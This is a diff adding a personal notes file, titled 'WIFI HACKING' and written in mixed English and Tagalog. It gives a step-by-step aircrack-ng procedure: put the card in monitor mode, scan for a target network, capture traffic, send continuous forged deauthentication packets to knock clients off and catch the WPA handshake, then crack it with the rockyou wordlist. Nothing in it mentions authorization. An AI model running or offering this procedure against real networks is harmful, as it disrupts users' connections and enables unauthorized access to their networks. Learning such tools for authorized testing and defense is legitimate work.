@@ -1,0 +1,78 @@
+WIFI HACKING
+
+******************************************************************************************************
+sudo su
+airmon-ng
+iwconfig
+
+*Monitor mode is used for passive wireless packet capturing and monitoring of nearby networks.
+----used for capturing and analyzing all wireless traffic in the area
+
+*Managed mode is used for normal client operation, allowing the wireless card to 
+connect to an access point and access the internet.
+----is for connecting to and using wifi networks
+
+
+#mode: Managed
+
+******************************************************************************************************
+KILL RUNNING WIFI
+
+airmon-ng check kill
+
+airmon-ng 
+
+*Remember the interface of  Ralink Technology
+
+airmon-ng start wlan1
+
+#mode: Monitor
+
+******************************************************************************************************
+SCAN WIFI AND GET THE BSSID 
+
+airodump-ng wlan1
+
+*Get the BSSID and CHANNEL of the Target
+
+airodump-ng wlan1 -d (BSSID of the TARGET)
+
+******************************************************************************************************
+THEN SCAN NATIN IF MAY NAKA CONNECT
+
+*OPEN TWO TERMINAL
+
+* TERMINAL ONE
+
+airodump-ng -w (FILE.NAME) -c (CHANNEL) --bssid (BSSID of the TARGET) wlan1
+
+* TERMINAL TWO
+
+aireplay-ng --deauth 0 -a (BSSID of the TARGET) wlan1
+
+@@The command "aireplay-ng --deauth 0 -a (BSSID of the TARGET) wlan" is used for deauthentication attacks in wireless security testing.
+It sends forged deauthentication packets to a target access point (AP) specified by its BSSID, causing connected clients to be 
+disconnected from the network temporarily.
+
+WAIT UNTIL MAKUHA YUNG (WPA HANDSHAKE: MAC ADDRESS)
+
+******************************************************************************************************
+DISABLE MONITOR MODE
+
+airmon-ng stop wlan1
+
+TYPE ( ls) FIND THE FILENAME  THAT YOU CREATED
+
+aircrack-ng filename-01.cap -w /usr/share/wordlists/rockyou.txt
+
+
+@@A wordlist in hacking is a text file containing a list of words, phrases, or passwords used for password cracking. 
+
+**************************************************************************
+rfkill unblock all
+
+systemctl restart NetworkManager
+
+CHANGE CHANNEL:
+airmon-ng stop wlan0 =>
+airmon-ng start wlan0 <channel>
